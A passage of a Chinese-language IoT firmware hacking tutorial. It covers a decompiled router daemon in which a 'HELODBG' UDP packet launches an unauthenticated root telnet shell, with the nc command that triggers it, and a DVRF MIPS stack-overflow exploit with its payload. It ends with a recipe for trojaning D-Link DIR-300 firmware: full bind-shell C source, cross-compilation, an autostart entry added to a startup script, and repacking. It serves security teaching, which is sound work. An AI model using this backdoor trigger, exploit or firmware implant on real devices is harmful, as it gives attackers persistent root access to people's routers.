+                am_comprintf(1, 0, 0, "UDPLOG: initialized!!\n");
+              }
+            }
+          }
+          appmgr_shm_init();
+          am_comprintf(1, 0, 0, "APPMGR: Init...\n");
+          am_comprintf(1, 0, 0, "APPMGR: AMAPI init...\n");
+          v12 = uiIPC_lib_init("appmgr", 0, 0xF);
+          v13 = appmgr_proc_initialize(v12);
+          cfgs_init(v13);
+          v14 = &dword_82AC0;
+          while ( 1 )
+          {
+            v16 = v14[1];
+            ++v14;
+            v15 = v16;
+            if ( !v16 )
+              break;
+            if ( *(_DWORD *)(v15 + 4) )
+            {
+              am_comprintf(1, 0, 0, "APPMGR: init mod[%d]\n", *(_DWORD *)v15);
+              (*(void (__fastcall **)(_DWORD))(v15 + 4))(0);
+            }
+          }
+          v17 = am_comprintf(1, 0, 0, "APPMGR: Daemon Startup...\n");
+          appmgr_daemon_startup(v17);
+          am_comprintf(1, 0, 0, "APPMGR: Startup...\n");
+          v18 = &dword_82AC0;
+          while ( 1 )
+          {
+            v20 = v18[1];
+            ++v18;
+            v19 = v20;
+            if ( !v20 )
+              break;
+            if ( *(_DWORD *)(v19 + 8) )
+            {
+              am_comprintf(1, 0, 0, "APPMGR: startup mod[%d]\n", *(_DWORD *)v19);
+              (*(void (__fastcall **)(_DWORD))(v19 + 8))(0);
+            }
+          }
+          am_comprintf(1, 0, 0, "APPMGR: Ready...\n");
+          appmgr_msg_broadcast_inner(7, 0, 0);
+          am_comprintf(1, 0, 0, "APPMGR: WorkingLoop...\n");
+          dword_7E180 = 0;
+          appmgr_msg_broadcast_inner(0x4F, 0, 0);
+          dword_84134 = (int)malloc(0x2000u);
+          v58 = (unsigned int)v7 >> 5;
+          v54 = 1 << (v7 & 0x1F);
+          v59 = (unsigned int)v55 >> 5;
+          v60 = 1 << (v55 & 0x1F);
+          while ( 1 )
+          {
+            while ( 1 )
+            {
+              if ( dword_830F0 )
+                goto LABEL_92;
+              v21 = 0;
+              timeout.tv_sec = 1;
+              timeout.tv_usec = 0;
+              do
+                v62.__fds_bits[v21++] = 0;
+              while ( v21 != 0x20 );
+              v22 = dword_7E174;
+              v23 = dword_7E174 < 0;
+              v62.__fds_bits[v58] |= v54;
+              sig = v7;
+              if ( !v23 )
+              {
+                v24 = &addr_len[((unsigned int)v22 >> 5) + 1];
+                v25 = v24[0xFFFFFFAC];
+                if ( v7 < v22 )
+                  sig = v22;
+                else
+                  sig = v7;
+                v24[0xFFFFFFAC] = v25 | (1 << (v22 & 0x1F));
+              }
+              if ( v55 >= 0 )
+              {
+                v26 = sig;
+                v62.__fds_bits[v59] |= v60;
+                if ( v26 < v55 )
+                  sig = v55;
+                else
+                  sig = v26;
+              }
+              appmgr_proc_FdSet(&v62, &sig);
+              v27 = select(sig + 1, &v62, 0, 0, &timeout);
+              v28 = (time_t *)dword_830F0;
+              if ( dword_830F0 )
+              {
+LABEL_92:
+                am_comprintf(1, 0, 0, "APPMGR: Shutdown...\n");
+                appmgr_msg_broadcast_inner(8, 0, 0);
+                qfmon_hdl_destroy(&gFmonHdl);
+                if ( gAM_usock_fd > 0 )
+                  close(gAM_usock_fd);
+                sprintf((char *)&v64, "%s/%s", "/var/usock", "appmgr.us");
+                v40 = unlink((const char *)&v64);
+                v41 = appmgr_proc_flush_all(v40);
+                appmgr_proc_deinitialize(v41);
+                v42 = am_comprintf(1, 0, 0, "APPMGR: Out of Work-Loop\n");
+                uiIPC_lib_deinit(v42);
+                if ( dword_7E174 >= 0 )
+                {
+                  close(dword_7E174);
+                  dword_7E174 = 0xFFFFFFFF;
+                }
+                if ( dword_84134 )
+                  free((void *)dword_84134);
+                exit(0);
+              }
+              if ( v27 > 0 )
+                break;
+              if ( v27 )
+              {
+                v37 = *_errno_location();
+                v38 = strerror(v37);
+                am_comprintf(1, v28, v28, "APPMGR: wait error(%d,%s)\n", v37, v38);
+              }
+              else
+              {
+                sub_116F8();
+                dword_8413C = time(0);
+              }
+LABEL_67:
+              v29 = time(0);
+              if ( v29 - dword_8413C > 1 || v29 < dword_8413C )
+              {
+                sub_116F8();
+                dword_8413C = time(0);
+              }
+              appmgr_daemon_Watchdog();
+            }
+            if ( (v54 & v62.__fds_bits[v58]) == 0 )
+            {
+              if ( (((unsigned int)v62.__fds_bits[(unsigned int)dword_7E174 >> 5] >> (dword_7E174 & 0x1F)) & 1) != 0 )
+              {
+                memset(v63, 0, sizeof(v63));
+                addr_len[0] = 0x10;
+                if ( dword_7E174 >= 0 )
+                {
+                  while ( recvfrom(dword_7E174, v63, 0x200u, 0, &stru_8411C, addr_len) > 0 )
+                  {
+                    if ( !strncmp("HELODBG", (const char *)v63, 7u) )
+                    {
+                      dword_7E178 = 1;
+                      strcpy((char *)v63, "Hello\n");
+                      v36 = strlen((const char *)v63);
+                      sendto(dword_7E174, v63, v36 + 1, 0, &stru_8411C, addr_len[0]);
+                      if ( !unk_84138 )
+                      {
+                        unk_84138 = 1;
+                        system("/sbin/telnetd -l /bin/sh");
+                      }
+                    }
+                    else if ( !strncmp("BYEDBG", (const char *)v63, 6u) )
+                    {
+                      dword_7E178 = 0;
+                    }
+                    LOBYTE(v63[0].sa_family) = 0;
+                  }
+                }
+              }
+              else if ( (v60 & v62.__fds_bits[v59]) != 0 )
+              {
+                qfmon_evt_handle(&gFmonHdl, &v62);
+              }
+              goto LABEL_66;
+            }
+            v30 = (unsigned __int16 *)dword_84134;
+            v31 = recv(v7, (void *)dword_84134, 0x101Cu, 0x4040);
+            v32 = *v30;
+            v56 = (char *)v30[5];
+            s1 = (char *)v30[3];
+            timer = (time_t *)v30[1];
+            v33 = time(v28);
+            am_comprintf(2, "main", 0x38D, "APPMGR: MSG [%hu->%hu] Len[%hu] OP[%hu] tm[%u]\n", v32, timer, v56, s1, v33);
+            if ( v30[5] + 0x1C == v31 )
+              break;
+            am_comprintf(1, v28, v28, "APPMGR: BUG !!!!! MSG size Need[%d]!=But[%d] !!!!!\n", v30[5] + 0x1C, v31);
+            if ( v31 > 0x1B )
+              break;
+            v34 = *_errno_location();
+            v35 = strerror(v34);
+            am_comprintf(1, v28, v28, "APPMGR: MSG without data, eno(%d,%s) sk(%d) rd(%d)\n", v34, v35, v7, v31);
+          }
+          v39 = v30[2];
+          if ( v39 > 0x58 )
+          {
+            if ( v39 != 0xD1 )
+              goto LABEL_89;
+            if ( dword_8412C > 0 )
+            {
+              am_comprintf(1, 0, 0, "AMGR[%hu->%hu] shutdn0=%d\n", *v30, v30[1], dword_8412C);
+              goto LABEL_66;
+            }
+            dword_8412C = 1;
+          }
+          else if ( v39 >= 0x57 || v39 == 6 )
+          {
+            if ( dword_8412C > 1 )
+            {
+              am_comprintf(1, 0, 0, "AMGR[%hu->%hu] shutdn(%hu)=%d\n", *v30, v30[1], v39, dword_8412C);
+              goto LABEL_66;
+            }
+            dword_8412C = 2;
+            if ( v39 == 6 )
+            {
+              am_comprintf(1, 0, 0, "AMGR[%hu->%hu] proc_shutdn(%hu)\n", *v30, v30[1], 6);
+              appmgr_proc_shutdown(1);
+            }
+          }
+          else
+          {
+LABEL_89:
+            if ( dword_8412C > 0 )
+            {
+              am_comprintf(1, 0, 0, "AMGR[%hu->%hu] shutdn=%d\n", *v30, v30[1], dword_8412C);
+LABEL_66:
+              appmgr_proc_FdIsSet(&v62);
+              goto LABEL_67;
+            }
+          }
+          v43 = *v30;
+          v44 = v30[1];
+          v45 = time(0);
+          am_comprintf(2, "main", 0x3BF, "APPMGR: MSG-Proc[%hu->%hu] Start[%u]\n", v43, v44, v45);
+          v46 = v30[2];
+          if ( (unsigned int)((v46 - 0xC1) << 0x10) <= 0x10000 )
+          {
+            appmgr_ev_process(v30);
+          }
+          else
+          {
+            v47 = &dword_82AC0;
+            do
+            {
+              v49 = (_DWORD *)v47[1];
+              ++v47;
+              v48 = v49;
+              if ( !v49 )
+              {
+                am_comprintf(
+                  1,
+                  "appmgr_msg_process",
+                  0x59D,
+                  "APPMGR: dst(%hd) msg_handle(id=%hu) not found\n",
+                  v30[1],
+                  v46);
+                goto LABEL_108;
+              }
+            }
+            while ( !v48[3] || *v48 != v30[1] );
+            appmgr_flog("MsgHdl:[%hu->%hu] Op1[%hu] In\n", *v30, v30[1], v30[3]);
+            ((void (__fastcall *)(unsigned __int16 *, unsigned __int16 *, _DWORD))v48[3])(v30, v30 + 0xE, v30[5]);
+            appmgr_flog("MsgHdl:[%hu->%hu] Op1[%hu] Out\n", *v30, v30[1], v30[3]);
+          }
+LABEL_108:
+          v50 = *v30;
+          v51 = v30[1];
+          v52 = time(0);
+          am_comprintf(2, "main", 0x3CD, "APPMGR: MSG-Proc[%hu->%hu] Done[%u]\n", v50, v51, v52);
+          if ( dword_8412C > 0 )
+          {
+            appmgr_proc_shutdown(1);
+            am_comprintf(1, 0, 0, "AMGR: daemons stop shutdn=%d\n", dword_8412C);
+          }
+          goto LABEL_66;
+        }
+        am_comprintf(1, "appmgr_uscok_create", 0x663, "Error binding socket\n");
+        v9 = 0xFFFFFFFC;
+      }
+    }
+    else
+    {
+      am_comprintf(1, "appmgr_uscok_create", 0x654, "USOCK(%s/%s) was already using\n", "/var/usock", "appmgr.us");
+      unlink(v63[0].sa_data);
+      v9 = 0xFFFFFFFE;
+    }
+  }
+  gAM_usock_fd = v9;
+  am_comprintf(1, 0, 0, "APPMGR: uscok_create fail\n");
+  return 0xFFFFFFFF;
+}
+```
+
+有一个线程会持续监听0.0.0.0:39889（UDP），并等待传入控制命令。
+
+如果某个用户向目标路由器发送了一个“HELODBG”字符串，那么路由器将会执行“/sbin/telnetd -l /bin/sh”，并允许这名用户在未经身份验证的情况下以root用户的身份登录路由器。
+
+验证
+
+```assembly
+$ echo -ne "HELODBG" | nc -u 192.168.1.1 39889
+Hello
+```
+
+除了以上这些，该固件还存在多个漏洞，详细的报告可以参考：https://www.anquanke.com/post/id/84671
+
+#### 基于固件仿真的动态分析
+
+通常，开展IoT设备分析会受到这样或那样的限制，其中一个就是我们难以在没有实体设备的情况下开展大量测试并进行漏洞利用。为了进行固件仿真，使用[Firmware Analysis Toolkit（FAT）](https://github.com/attify/firmware-analysis-toolkit)。FAT使用[Firmadyne](https://github.com/firmadyne/firmadyne)工具实现固件镜像的仿真。
+
+为了方便直接使用attifyti提供的物联网渗透专用虚拟机。该系统为ubuntu14，密码为password@123/attify，Firmadyne数据库默认密码为firmadyne。
+
+使用D-Link固件DWP2360b为例进行分析。
+
+> sudo ./fat.py DWP2360b-firmware-v206-rc018.bin
+
+按`Enter`键运行该固件，等运行完了以后就可以从浏览器访问了
+
+![]({{site.baseurl}}/img/2022-01-05-show.jpg)
+
+#### MIPS架构下的漏洞利用
+
+[DVRF](https://github.com/praetorian-inc/DVRF)是为MIPS平台开发的固件，从固件中提取文件系统
+
+```assembly
+iot@attifyos ~/D/D/Firmware> binwalk -t -e DVRF_v03.bin
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             BIN-Header, board ID: 1550, hardware version:
+                              4702, firmware version: 1.0.0, build date:
+                              2012-02-08
+32            0x20            TRX firmware header, little endian, image size:
+                              7753728 bytes, CRC32: 0x436822F6, flags: 0x0,
+                              version: 1, header size: 28 bytes, loader
+                              offset: 0x1C, linux kernel offset: 0x192708,
+                              rootfs offset: 0x0
+60            0x3C            gzip compressed data, maximum compression, has
+                              original file name: "piggy", from Unix, last
+                              modified: 2016-03-09 08:08:31
+1648424       0x192728        Squashfs filesystem, little endian, non-standard
+                              signature, version 3.0, size: 6099215 bytes, 447
+                              inodes, blocksize: 65536 bytes, created:
+                              2016-03-10 04:34:22
+```
+
+使用readelf命令查看二进制文件架构
+
+```assembly
+iot@attifyos ~/D/D/F/_/squashfs-root> readelf -h pwnable/Intro/stack_bof_01 
+ELF Header:
+  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
+  Class:                             ELF32
+  Data:                              2's complement, little endian
+  Version:                           1 (current)
+  OS/ABI:                            UNIX - System V
+  ABI Version:                       0
+  Type:                              EXEC (Executable file)
+  Machine:                           MIPS R3000
+  Version:                           0x1
+  Entry point address:               0x400630
+  Start of program headers:          52 (bytes into file)
+  Start of section headers:          3900 (bytes into file)
+  Flags:                             0x50001007, noreorder, pic, cpic, o32, mips32
+  Size of this header:               52 (bytes)
+  Size of program headers:           32 (bytes)
+  Number of program headers:         6
+  Size of section headers:           40 (bytes)
+  Number of section headers:         29
+  Section header string table index: 26
+```
+
+将对应架构的QEMU二进制文件复制到文件系统的根目录下
+
+```assembly
+iot@attifyos ~/D/D/F/_/squashfs-root> cp (which qemu-mipsel-static) .
+```
+
+使用chroot命令和QEMU虚拟机仿真运行目标二进制文件，同时使二进制文件认为其根目录就是当前我们执行命令的目录。
+
+```assembly
+iot@attifyos ~/D/D/F/_/squashfs-root> 
+sudo chroot . ./qemu-mipsel-static pwnable/Intro/stack_bof_01 
+[sudo] password for iot: 
+Usage: stack_bof_01 <argument>
+-By b1ack0wl
+```
+
+反编译查看main函数
+
+```assembly
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  __int16 v4[100]; // [sp+18h] [+18h] BYREF
+
+  memset(v4, 0, sizeof(v4));
+  if ( argc < 2 )
+  {
+    puts("Usage: stack_bof_01 <argument>\r\n-By b1ack0wl\r");
+    exit(1);
+  }
+  puts("Welcome to the first BoF exercise!\r\n\r");
+  strcpy((char *)v4, argv[1]);
+  printf("You entered %s \r\n", (const char *)v4);
+  puts("Try Again\r");
+  return 65;
+}
+```
+
+一个简单的栈溢出
+
+调试程序，把调试器附加到进程上
+
+```assembly
+iot@attifyos ~/D/D/F/_/squashfs-root> 
+sudo chroot . ./qemu-mipsel-static -g 1234 pwnable/Intro/stack_bof_01 
+```
+
+启动GDB调试器
+
+```assembly
+iot@attifyos ~/D/D/F/_/squashfs-root> gdb-multiarch pwnable/Intro/stack_bof_01 
+GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git
+Copyright (C) 2018 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+Type "show configuration" for configuration details.
+For bug reporting instructions, please see:
+<http://www.gnu.org/software/gdb/bugs/>.
+Find the GDB manual and other documentation resources online at:
+<http://www.gnu.org/software/gdb/documentation/>.
+For help, type "help".
+Type "apropos word" to search for commands related to "word"...
+GEF for linux ready, type `gef' to start, `gef config' to configure
+76 commands loaded for GDB 8.1.0.20180409-git using Python engine 3.6
+[*] 4 commands could not be loaded, run `gef missing` to know why.
+Reading symbols from pwnable/Intro/stack_bof_01...(no debugging symbols found)...done.
+gef➤  set architecture mips
+The target architecture is assumed to be mips
+gef➤  target remote 127.0.0.1:1234
+Remote debugging using 127.0.0.1:1234
+warning: remote target does not support file transfer, attempting to access files from local filesystem.
+Reading symbols from /home/iot/Desktop/DVRF/Firmware/_DVRF_v03.bin.extracted/squashfs-root/lib/ld-uClibc.so.0...(no debugging symbols found)...done.
+```
+
+漏洞利用
+
+反编译的main函数v4变量的大小存在问题，查看汇编
+
+```assembly
+.text:004007E0  # int __cdecl main(int argc, const char **argv, const char **envp)
+.text:004007E0                 .globl main
+.text:004007E0 main:                                    # DATA XREF: LOAD:004003A4↑o
+.text:004007E0                                          # _ftext+1C↑o ...
+.text:004007E0
+.text:004007E0 var_D0          = -0xD0
+.text:004007E0 var_C8          = -0xC8
+.text:004007E0 var_C6          = -0xC6
+.text:004007E0 var_s0          =  0
+.text:004007E0 var_s4          =  4
+.text:004007E0 arg_0           =  8
+.text:004007E0 arg_4           =  0xC
+.text:004007E0
+.text:004007E0                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)
+.text:004007E8                 addu    $gp, $t9
+.text:004007EC                 addiu   $sp, -0xE8
+.text:004007F0                 sw      $ra, 0xE0+var_s4($sp)
+.text:004007F4                 sw      $fp, 0xE0+var_s0($sp)
+.text:004007F8                 move    $fp, $sp
+.text:004007FC                 sw      $gp, 0xE0+var_D0($sp)
+.text:00400800                 sw      $a0, 0xE0+arg_0($fp)
+.text:00400804                 sw      $a1, 0xE0+arg_4($fp)
+.text:00400808                 li      $v0, dword_400000
+.text:0040080C                 nop
+.text:00400810                 lhu     $v0, (word_400B88 - 0x400000)($v0)
+.text:00400814                 nop
+.text:00400818                 sh      $v0, 0xE0+var_C8($fp)
+.text:0040081C                 addiu   $v0, $fp, 0xE0+var_C6
+.text:00400820                 li      $v1, 0xC6
+.text:00400824                 move    $a0, $v0         # s
+.text:00400828                 move    $a1, $zero       # c
+.text:0040082C                 move    $a2, $v1         # n
+.text:00400830                 la      $t9, memset
+.text:00400834                 nop
+.text:00400838                 jalr    $t9 ; memset
+.text:0040083C                 nop
+.text:00400840                 lw      $gp, 0xE0+var_D0($fp)
+.text:00400844                 lw      $v0, 0xE0+arg_0($fp)
+.text:00400848                 nop
+.text:0040084C                 slti    $v0, 2
+.text:00400850                 beqz    $v0, loc_40088C
+.text:00400854                 nop
+.text:00400858                 li      $v0, dword_400000
+.text:0040085C                 nop
+.text:00400860                 addiu   $a0, $v0, (aUsageStackBof0 - 0x400000)  # "Usage: stack_bof_01 <argument>\r\n-By b"...
+.text:00400864                 la      $t9, puts
+.text:00400868                 nop
+.text:0040086C                 jalr    $t9 ; puts
+.text:00400870                 nop
+.text:00400874                 lw      $gp, 0xE0+var_D0($fp)
+.text:00400878                 li      $a0, 1           # status
+.text:0040087C                 la      $t9, exit
+.text:00400880                 nop
+.text:00400884                 jalr    $t9 ; exit
+.text:00400888                 nop
+.text:0040088C  # ---------------------------------------------------------------------------
+.text:0040088C
+.text:0040088C loc_40088C:                              # CODE XREF: main+70↑j
+.text:0040088C                 li      $v0, dword_400000
+.text:00400890                 nop
+.text:00400894                 addiu   $a0, $v0, (aWelcomeToTheFi - 0x400000)  # "Welcome to the first BoF exercise!\r\n"...
+.text:00400898                 la      $t9, puts
+.text:0040089C                 nop
+.text:004008A0                 jalr    $t9 ; puts
+.text:004008A4                 nop
+.text:004008A8                 lw      $gp, 0xE0+var_D0($fp)
+.text:004008AC                 lw      $v0, 0xE0+arg_4($fp)
+.text:004008B0                 nop
+.text:004008B4                 addiu   $v0, 4
+.text:004008B8                 lw      $v0, 0($v0)
+.text:004008BC                 nop
+.text:004008C0                 move    $v1, $v0
+.text:004008C4                 addiu   $v0, $fp, 0xE0+var_C8
+.text:004008C8                 move    $a0, $v0         # dest
+.text:004008CC                 move    $a1, $v1         # src
+.text:004008D0                 la      $t9, strcpy
+.text:004008D4                 nop
+.text:004008D8                 jalr    $t9 ; strcpy
+.text:004008DC                 nop
+.text:004008E0                 lw      $gp, 0xE0+var_D0($fp)
+.text:004008E4                 nop
+.text:004008E8                 li      $v0, dword_400000
+.text:004008EC                 nop
+.text:004008F0                 addiu   $a0, $v0, (aYouEnteredS - 0x400000)  # "You entered %s \r\n"
+.text:004008F4                 addiu   $v0, $fp, 0xE0+var_C8
+.text:004008F8                 move    $a1, $v0
+.text:004008FC                 la      $t9, printf
+.text:00400900                 nop
+.text:00400904                 jalr    $t9 ; printf
+.text:00400908                 nop
+.text:0040090C                 lw      $gp, 0xE0+var_D0($fp)
+.text:00400910                 nop
+.text:00400914                 li      $v0, dword_400000
+.text:00400918                 nop
+.text:0040091C                 addiu   $a0, $v0, (aTryAgain - 0x400000)  # "Try Again\r"
+.text:00400920                 la      $t9, puts
+.text:00400924                 nop
+.text:00400928                 jalr    $t9 ; puts
+.text:0040092C                 nop
+.text:00400930                 lw      $gp, 0xE0+var_D0($fp)
+.text:00400934                 li      $v0, 0x41  # 'A'
+.text:00400938                 move    $sp, $fp
+.text:0040093C                 lw      $ra, 0xE0+var_s4($sp)
+.text:00400940                 lw      $fp, 0xE0+var_s0($sp)
+.text:00400944                 addiu   $sp, 0xE8
+.text:00400948                 jr      $ra
+.text:0040094C                 nop
+.text:0040094C  # End of function main
+```
+
+定位到strcpy函数，找到第一个参数为0xE0+var_C8，查看var_C8
+
+> var_C8          = -0xC8
+
+所以可以知道v4变量的大小为0xC8（200）
+
+查看后门函数的地址0x400950，但是要略过前3条gp相关的指令
+
+```assembly
+.text:00400950
+.text:00400950  # Attributes: noreturn bp-based frame fpd=0x18
+.text:00400950
+.text:00400950  # void __noreturn dat_shell()
+.text:00400950                 .globl dat_shell
+.text:00400950 dat_shell:
+.text:00400950
+.text:00400950 var_8           = -8
+.text:00400950 var_s0          =  0
+.text:00400950 var_s4          =  4
+.text:00400950
+.text:00400950                 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0 - .)
+.text:00400958                 addu    $gp, $t9
+.text:0040095C                 addiu   $sp, -0x20
+.text:00400960                 sw      $ra, 0x18+var_s4($sp)
+.text:00400964                 sw      $fp, 0x18+var_s0($sp)
+.text:00400968                 move    $fp, $sp
+.text:0040096C                 sw      $gp, 0x18+var_8($sp)
+.text:00400970                 li      $v0, dword_400000
+.text:00400974                 nop
+.text:00400978                 addiu   $a0, $v0, (aCongratsIWillN - 0x400000)  # "Congrats! I will now execute /bin/sh\r"...
+.text:0040097C                 la      $t9, puts
+.text:00400980                 nop
+.text:00400984                 jalr    $t9 ; puts
+.text:00400988                 nop
+.text:0040098C                 lw      $gp, 0x18+var_8($fp)
+.text:00400990                 nop
+.text:00400994                 li      $v0, dword_400000
+.text:00400998                 nop
+.text:0040099C                 addiu   $a0, $v0, (aBinShC - 0x400000)  # "/bin/sh -c"
+.text:004009A0                 la      $t9, system
+.text:004009A4                 nop
+.text:004009A8                 jalr    $t9 ; system
+.text:004009AC                 nop
+.text:004009B0                 lw      $gp, 0x18+var_8($fp)
+.text:004009B4                 move    $a0, $zero       # status
+.text:004009B8                 la      $t9, exit
+.text:004009BC                 nop
+.text:004009C0                 jalr    $t9 ; exit
+.text:004009C4                 nop
+.text:004009C4  # End of function dat_shell
+.text:004009C4
+.text:004009C4  # ---------------------------------------------------------------------------
+.text:004009C8                 .align 4
+```
+
+所以跳转到0x40095C
+
+```assembly
+iot@attifyos ~/D/D/F/_/squashfs-root> 
+sudo chroot . ./qemu-mipsel-static pwnable/Intro/stack_bof_01 (python -c "print 'a'*204+'\x5c\x09\x40'")
+Welcome to the first BoF exercise!
+
+You entered aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\	@ 
+Try Again
+Congrats! I will now execute /bin/sh
+- b1ack0wl
+```
+
+#### 使用firmware-mod-kit(FMK)在固件中添加后门
+
+[FMK](https://github.com/brianpow/firmware-mod-kit)不仅可以利用Binwalk或其他工具从固件中提取出文件系统，还具有将篡改后的文件系统重新打包成新固件的功能。
+
+在http://support.dlink.com.au/download/download.aspx?product=dir-300下载D-Link DIR-300路由器的固件。
+
+在这里使用FMK目录下的脚本从固件中提取文件系统
+
+```assembly
+iot@attifyos ~/t/firmware-mod-kit> 
+sudo ./extract-firmware.sh dir300_v1.05_976h.bin 
+Firmware Mod Kit (extract) 0.99, (c)2011-2013 Craig Heffner, Jeremy Collake
+
+Scanning firmware...
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+48            0x30            Unix path: /dev/mtdblock/2
+96            0x60            LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 1650688 bytes
+524384        0x80060         PackImg section delimiter tag, little endian size: 3153152 bytes; big endian size: 1912832 bytes
+524416        0x80080         Squashfs filesystem, big endian, version 2.0, size: 1911780 bytes, 946 inodes, blocksize: 65536 bytes, created: 2009-07-06 09:38:42
+
+Extracting 524416 bytes of  header image at offset 0
+Extracting squashfs file system at offset 524416
+Extracting squashfs files...
+Firmware extraction successful!
+Firmware parts can be found in '/home/iot/tools/firmware-mod-kit/dir300_v1.05_976h/*'
+```
+
+提取出固件后，脚本会生成一个新目录，其中包括rootfs、image_part和logs等文件夹，由于攻击者的目的大多是添加后门和修改固件，因此我们只关心rootfs文件夹。rootfs文件夹中包含了固件中的整套文件系统。我们要在固件中添加后门，然后找到固件启动后自动调用后门的方法。
+
+因为固件是MIPS小端架构的，所以我们需要开发符合MIPS小端架构的后门并进行编译。
+
+```assembly
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+
+#define SERVER_PORT 9999
+
+int main(){
+	int serverfd, clientfd, server_pid, i=0;
+	char *banner = "[~] Welcome to @OsandaMalith's Bind Shell\n";
+	char *args[] = {"/bin/busybox", "sh", (char *)0};
+
+	struct sockaddr_in server, client;
+	socklen_t len;
+
+	server.sin_family = AF_INET;
+	server.sin_port = htons(SERVER_PORT);
+	server.sin_addr.s_addr = INADDR_ANY;
+
+
+	serverfd = socket(AF_INET, SOCK_STREAM, 0);
+	bind(serverfd, (struct sockaddr *)&server, sizeof(server));
+	listen(serverfd, 1);
+
+	while(1){
+		len = sizeof(struct sockaddr);
+		clientfd = accept(serverfd, (struct sockaddr *)&client, &len);
+
+		server_pid = fork();
+		if(server_pid){
+			write(clientfd, banner, strlen(banner));
+			for(; i<3; i++){
+				dup2(clientfd, i);
+			}
+			execve("/bin/busybox", args, (char *)0);
+			close(clientfd);
+		}
+		close(clientfd);
+	}
+	return 0;
+}
+```
+
+使用MIPSEL架构的Buildroot，可以在 **buildroot/output/host/usr/bin**目录下找到生成的交叉编译工具，mips的编译器就是该目录下的**mipsel-linux-gcc**。
+
+```assembly
+iot@attifyos ~/t/b/o/h/bin> 
+sudo ./mipsel-linux-gcc -o ~/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/bindshell ~/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c -static
+/home/iot/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c: In function ‘main’:
+/home/iot/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c:31:16: warning: implicit declaration of function ‘fork’ [-Wimplicit-function-declaration]
+   server_pid = fork();
+                ^~~~
+/home/iot/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c:33:4: warning: implicit declaration of function ‘write’; did you mean ‘writev’? [-Wimplicit-function-declaration]
+    write(clientfd, banner, strlen(banner));
+    ^~~~~
+    writev
+/home/iot/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c:35:5: warning: implicit declaration of function ‘dup2’ [-Wimplicit-function-declaration]
+     dup2(clientfd, i);
+     ^~~~
+/home/iot/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c:37:4: warning: implicit declaration of function ‘execve’ [-Wimplicit-function-declaration]
+    execve("/bin/busybox", args, (char *)0);
+    ^~~~~~
+/home/iot/Desktop/tools/firmware-mod-kit/dir300_v1.05_976h/backdoor.c:38:4: warning: implicit declaration of function ‘close’; did you mean ‘pclose’? [-Wimplicit-function-declaration]
+    close(clientfd);
+    ^~~~~
+    pclose
+```
+
+下一步在文件系统中寻找可以放置该二进制文件的地方，以及如何在启动过程中将其设置为自启动。
+
+我们将编译好的bindshell文件放在etc/templates/目录下，在etc/scripts/system.sh脚本中调用该二进制文件
+
+```assembly
+#!/bin/sh
+case "$1" in
+start)
+	echo "start backdoor"
+	/etc/templates/bindshell
+	echo "start fresetd ..."		> /dev/console
+	fresetd &
+```
+
+使用build-firmware.sh脚本将修改后的文件系统重新打包为新的固件
+
+```assembly
+iot@attifyos ~/t/firmware-mod-kit>sudo ./build-firmware.sh ./dir300_v1.05_976h/ -nopad -min
+```
+
+执行完成后会在目录下生成新的固件，新固件名为new-firmware.bin，此时就创建完成了新的固件镜像，我们可以将新固件复制到FAT目录下，并通过仿真来验证新添加的后门能否正常运行。
+
+尝试连接目标IP的9999端口，检查后门是否成功启动。
+
+```
+>nc 192.168.0.1 9999
+```
+
